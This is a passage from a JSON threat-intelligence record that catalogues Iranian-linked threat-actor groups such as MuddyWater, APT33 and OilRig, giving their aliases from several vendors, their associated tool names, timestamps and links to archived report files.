                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9fe49a5b-f3e6-4fbf-99a1-db15dad460c3",
            "created_at": "2024-05-01T02:03:08.045004Z",
            "updated_at": "2025-03-27T02:05:17.325038Z",
            "deleted_at": null,
            "main_name": "COBALT TRINITY",
            "aliases": [
                "Elfin ",
                "HOLMIUM ",
                "MAGNALIUM ",
                "Peach Sandstorm ",
                "Refined Kitten ",
                "TA451 ",
                "APT33 "
            ],
            "source_name": "Secureworks:COBALT TRINITY",
            "tools": [
                " Cadlotcorg",
                " Dello RAT",
                " Imminent Monitor",
                " KDALogger",
                " Koadic",
                " NanoCore",
                " NetWire",
                " POWERTON",
                " PoshC2",
                " Poylog",
                " PupyRAT",
                " Schoolbag",
                "AutoCore"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535545,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1653760630,
    "ts_modification_date": 1653760630,
    "files": {
        "pdf": "https://archive.orkl.eu/880d02146357a02e65406c3eb4279c9243641c7c.pdf",
        "text": "https://archive.orkl.eu/880d02146357a02e65406c3eb4279c9243641c7c.txt",
        "img": "https://archive.orkl.eu/880d02146357a02e65406c3eb4279c9243641c7c.jpg"
    }
}